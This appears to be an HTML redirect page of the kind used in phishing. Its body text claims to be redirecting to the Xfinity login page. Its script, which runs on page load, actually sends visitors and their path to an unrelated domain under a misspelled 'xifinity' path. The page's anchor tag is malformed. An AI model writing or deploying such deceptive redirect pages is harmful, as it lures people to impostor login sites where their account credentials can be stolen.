<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Redirecting...</title>
  <link rel="canonical" href="https://held.sa.com/xifinity">
  <script>
    // Redirect with path preservation
    const targetDomain = "https://held.sa.com/xifinity";
    const path = window.location.pathname; // e.g., /old-path/page
    window.location.href = targetDomain + path;
  </script>
</head>
<body>
  <p>Redirecting to <a https://login.xfinity.com/login</a>...</p>
</body>
</html>
